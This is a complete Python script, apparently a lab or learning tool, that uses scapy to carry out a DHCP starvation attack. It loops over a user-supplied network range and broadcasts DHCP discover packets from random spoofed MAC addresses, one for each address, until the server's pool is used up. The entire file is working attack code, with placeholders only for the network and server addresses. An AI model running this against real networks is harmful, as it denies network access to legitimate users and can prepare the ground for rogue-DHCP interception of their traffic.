#!/usr/bin/python3
from tabnanny import verbose
import scapy.all as scapy
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC, conf
from time import sleep
import ipaddress

# conf.checkIPaddr must be set to false. 
conf.checkIPaddr = False
possible_ips = [str(ip) for ip in ipaddress.IPv4Network('IP.Address.Goes.Here')]

# Create a DHCP starvation attack, with fake MAC Addresses and use them to ask for IP.
for ip_add in possible_ips:
    fake_src_mac = RandMAC()
    broadcast= Ether(src=fake_src_mac, dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src="0.0.0.0", dst="255.255.255.255")

    udp = UDP(sport=68, dport=67)
    # The opcode of 1 says that it is a boot request. Client hardware address is assigned a random MAC Address. Bootp is the predecessor of DHCP
    bootp = BOOTP(op=1, chaddr = fake_src_mac)
    # Send DHCP discover message. Ask DHCP server for IP Addresses.
    dhcp = DHCP(options=[("message-type", "discover"), ("requested_addr", ip_add), ("server-id", "DHCP.Server.IP.Goes.Here"), ('end')])
    
    pkt = broadcast / ip / udp / bootp / dhcp

    sendp(pkt,iface='eth0', verbose=0)
    # Send out a new packet every 0.4 seconds
    sleep(0.4)
    print(f"sending packet - {ip_add}")
